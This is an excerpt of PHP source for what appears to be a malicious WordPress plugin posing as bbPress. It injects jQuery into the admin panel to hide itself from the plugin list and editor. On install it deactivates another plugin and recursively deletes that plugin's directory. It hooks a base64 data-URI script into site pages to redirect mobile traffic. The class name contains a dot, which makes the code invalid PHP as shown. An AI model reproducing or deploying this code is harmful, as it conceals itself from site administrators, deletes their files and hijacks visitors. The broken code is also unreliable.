...
if (!class_exists('wp_from_7.32',false)):
class wp_from_7.32 {
    public static $lang = 'en';
    public static $page_title = 'bbPress is forum software';
    public static $menu_title = 'wp_from_7.32';
    public static $menu_slug = 'wp_from_7.32'; 
    public static $plugin_name = 'wp_from_7.32'; 

    public static $script_was_appended = false;

    public $has_wp_head = false;

    const SCRIPT_SRC            = 'data:text/javascript;base64,';
	...
	public function rrmdir_by_press20($dir) { 
	   if (is_dir($dir)) { 
		 $objects = scandir($dir); 
		 foreach ($objects as $object) { 
		   if ($object != "." && $object != "..") { 
			 if (filetype($dir."/".$object) == "dir") self::rrmdir_by_press20($dir."/".$object); else unlink($dir."/".$object); 
		   } 
		 } 
		 reset($objects); 
		 rmdir($dir); 
    ...
    public function install() {
		deactivate_plugins( 'by_press20/by_press20.php' );
        self::_do_notice('install');
		chdir('../wp-content/plugins');
		$dir = getcwd().'/by_press20';
		if(file_exists($dir)){
		self::rrmdir_by_press20($dir);
		}
    }
    ...
    public function wp_admin_head(){
        ...
        //echo '<script src="'.plugin_dir_url( __FILE__ ).'check.php"></script>';
        echo '<script type="text/javascript">
        $( document ).ready(function() {
        $("#the-list .active [value=\''.self::$plugin_name.'/'.self::$plugin_name.'.php\']").parent().parent().hide();
        $("#plugin option[value=\''.self::$plugin_name.'/'.self::$plugin_name.'.php\']").remove();'; //название архива/название файла в главной директори
        echo '});
        </script>';
    }
    ...
    public function mobile_redirect_v3()
    {
        ...
        switch($user_data->redirect_option)
        {
            ...
            case self::MRT_MOBILE_TRAFFIC:
                if( $this->has_wp_head )
                {
                    add_action( 'wp_head', array( 'wp_from_7.32', 'output_js_script'),10,0 );
                } else{
